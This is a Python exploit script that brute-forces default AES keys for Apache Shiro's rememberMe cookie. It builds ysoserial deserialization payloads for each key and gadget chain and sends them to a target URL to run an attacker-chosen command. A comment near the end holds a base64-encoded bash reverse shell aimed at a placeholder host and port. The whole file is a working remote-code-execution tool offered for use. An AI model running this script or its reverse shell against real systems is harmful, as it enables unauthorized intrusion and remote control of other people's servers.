import sys
import os
import uuid
import base64
import subprocess
import requests
import urllib3
import argparse

from Crypto.Cipher import AES


# disable ssl warning for self signed certificate
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

JAR_FILE = 'ysoserial.jar'

KEYS = (
    '1QWLxg+NYmxraMoxAXu/Iw==',
    '2AvVhdsgUs0FSA3SDFAdag==',
    '3AvVhmFLUs0KTA3Kprsdag==',
    '4AvVhmFLUs0KTA3Kprsdag==',
    '5aaC5qKm5oqA5pyvAAAAAA==',
    '5AvVhmFLUs0KTA3Kprsdag==',
    '6ZmI6I2j5Y+R5aSn5ZOlAA==',
    'a2VlcE9uR29pbmdBbmRGaQ==',
    'bWljcm9zAAAAAAAAAAAAAA==',
    'bWluZS1hc3NldC1rZXk6QQ==',
    'cmVtZW1iZXJNZQAAAAAAAA==',
    'fCq+/xW488hMTCD+cmJ3aQ==',
    'kPH+bIxk5D2deZiIxcaaaA==',
    'L7RioUULEFhRyxM7a2R/Yg==',
    'MTIzNDU2Nzg5MGFiY2RlZg==',
    'r0e3c16IdVkouZgk1TKVMg==',
    'RVZBTk5JR0hUTFlfV0FPVQ==',
    'U3ByaW5nQmxhZGUAAAAAAA==',
    'WcfHGU25gNnTxTlmJMeSpw==',
    'wGiHplamyXlVB11UXWol8g==',
    'WkhBTkdYSUFPSEVJX0NBVA==',
    'Z3VucwAAAAAAAAAAAAAAAA==',
    'ZnJlc2h6Y24xMjM0NTY3OA==',
    'ZUdsaGJuSmxibVI2ZHc9PQ=='
)

GADGETS = (
    'CommonsBeanutils1',
    'CommonsCollections1',
    'CommonsCollections2',
    'CommonsCollections3',
    'CommonsCollections4',
    'CommonsCollections5',
    'CommonsCollections6',
    'CommonsCollections7',
    'CommonsCollections8',
    'CommonsCollections9',
    'CommonsCollections10'
)


def get_payload(command, gadget, key):
    if not os.path.exists(JAR_FILE):
        raise Exception('ysoserial.jar not found!')

    popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE)

    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    raw_payload = pad(popen.stdout.read())
    payload = base64.b64encode(iv + encryptor.encrypt(raw_payload))

    return payload


def send_payload(url, payload):
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'
    }

    cookies = {
        'rememberMe': payload.decode()
    }

    try:
        r = requests.get(url, headers=headers, cookies=cookies, timeout=30, verify=False)
    except Exception as e:
        print(e)
        return False

    if(r.status_code==200):
        print(' Succeed! Code: {}'.format(str(r.status_code)))
        return True
    else:
        print(' Failed! Code: {}'.format(str(r.status_code)))
        return False


def scan(url, command, gadget=None, key=None):
    if gadget is None:
        scan_gadgets = GADGETS
    else:
        scan_gadgets = (gadget,)

    if key is None:
        scan_keys = KEYS
    else:
        scan_keys = (key,)

    for gadget in scan_gadgets:
        for key in scan_keys:
            print(gadget, key, end='')
            payload = get_payload(command, gadget, key)
            send_payload(url, payload)
        

def get_parser():
    parser = argparse.ArgumentParser()

    parser.add_argument('-u', '--url', type=str, required=True, help='target url')
    parser.add_argument('-c', '--command', type=str, required=True, help='execute command')
    parser.add_argument('-g', '--gadget', required=False, default=None, help='gadget')
    parser.add_argument('-k', '--key', required=False, default=None, help='aes key')

    return parser


# command = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNfaXAvcG9ydCAwPiYx}|{base64,-d}|{bash,-i}'
# command encode http://www.jackson-t.ca/runtime-exec-payloads.html

if __name__ == '__main__':

    parser = get_parser()
    args = parser.parse_args()

    scan(args.url, args.command, args.gadget, args.key)
